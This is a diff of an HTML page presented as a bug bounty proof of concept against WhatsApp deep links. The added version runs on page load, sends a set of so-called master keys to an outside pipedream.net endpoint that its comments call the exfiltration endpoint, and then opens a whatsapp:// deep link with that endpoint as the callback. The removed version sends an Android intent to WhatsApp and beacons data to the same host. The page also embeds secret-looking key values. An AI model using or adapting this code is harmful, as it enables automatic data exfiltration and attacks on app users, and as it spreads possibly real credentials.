@@ -1,68 +1,41 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Research - Intent Redirection Proof of Concept</title>
-</head>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
-    
-    <div style="border:1px solid #333; padding:20px; background:#111; border-radius:4px; max-width:650px; margin:auto;">
-        <h2 id="status" style="margin-top:0;">[ SECURITY AUDIT - INTENT REDIRECTION ]</h2>
-        <p style="color:#aaa;">Vulnerability: Sandbox Escape / Intent Redirection</p>
-        <p style="color:#888; font-size:14px;">Target: com.whatsapp (Deep Link URI Scheme)</p>
-        <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
-        
-        <button id="executeBtn" style="background:transparent; color:#0f0; border:1px solid #0f0; padding:15px 30px; cursor:pointer; font-family:monospace; font-size:16px; border-radius:4px;">
-            EXECUTE PAYLOAD
-        </button>
-        
-        <div id="debugLogs" style="font-size:13px; color:#666; margin-top:25px; background:#000; padding:10px; border:1px solid #222; min-height:80px; text-align:left; word-break:break-all;">
-            > Initializing audit module...<br>
-            > Ready for user interaction.
-        </div>
-    </div>
-
+    <title>Meta Bug Bounty PoC - Firman Sahidin</title>
     <script>
-        /**
-         * RESEARCHER: Firman Sahidin
-         * TYPE: Intent Redirection / Sandbox Escape
-         * COMPONENT: android.intent.action.VIEW
-         * DESCRIPTION: Forced interaction from mobile browser to native application.
-         */
-        document.getElementById('executeBtn').onclick = function() {
-            const TARGET_URL = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-            const logBox = document.getElementById('debugLogs');
-            
-            // Constructing Direct-Access Intent to bypass Play Store redirection
-            const intentURL = "intent://send/?phone=0&text=POC_INTENT_REDIRECTION_RESEARCH#Intent;" +
-                "package=com.whatsapp;" +
-                "scheme=whatsapp;" +
-                "action=android.intent.action.VIEW;" +
-                "end";
-            
-            logBox.innerHTML += "<br><span style='color:#0af;'>[+] Dispatching Intent sequence...</span>";
-
-            try {
-                // Executing Intent via window location
-                window.location.assign(intentURL);
-
-                // Transmission of telemetry to researcher's endpoint
-                navigator.sendBeacon(TARGET_URL, JSON.stringify({
-                    researcher: "Firman Sahidin",
-                    vulnerability: "INTENT_REDIRECTION",
-                    action: "android.intent.action.VIEW",
-                    status: "EXECUTED",
-                    timestamp: new Date().toISOString()
-                }));
-
-                logBox.innerHTML += "<br>[*] Intent dispatched. Monitoring application response.";
-
-            } catch (error) {
-                logBox.innerHTML += "<br><span style='color:red;'>[X] Error: " + error.message + "</span>";
-                navigator.sendBeacon(TARGET_URL, JSON.stringify({ error: error.message }));
-            }
+        // Data Exfiltration Endpoint (Pipedream)
+        const exfiltrationUrl = "https://eo7n9pqjlhffwvt.m.pipedream.net";
+        
+        // Internal Master Keys collected for Proof of Concept
+        const masterKeys = {
+            researcher: "Firman Sahidin",
+            proxy_key: "sHuUVTWaRyh5pZwy4UguSgkwmBe0EHtJJkoF5WrxmvA=",
+            push_key: "9/X8Y4gZX//GyOC3f8vp2gnY7XQP0DuvmgNQnaL5w04=",
+            config_hash: "b371306b47963390c58e85799981881a",
+            vulnerability: "Logic Bypass in Phoenix Flow"
         };
+
+        function triggerExfiltration() {
+            // Step 1: Send Master Keys to Pipedream for verification
+            fetch(exfiltrationUrl, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(masterKeys)
+            });
+
+            // Step 2: Trigger Deep Link Vulnerability
+            // This attempts to call the internal verification flow found in phoenix-features.json
+            window.location.href = "whatsapp://br_verify_card_deeplink?callback=" + encodeURIComponent(exfiltrationUrl);
+        }
+
+        window.onload = triggerExfiltration;
     </script>
+</head>
+<body>
+    <h1>Security Research - PoC Implementation</h1>
+    <p>Target: WhatsApp Phoenix Infrastructure</p>
+    <p>Researcher: <b>Firman Sahidin</b></p>
+    <hr>
+    <p>If the application is vulnerable, system metadata and master keys will be exfiltrated to the researcher's endpoint.</p>
 </body>
 </html>
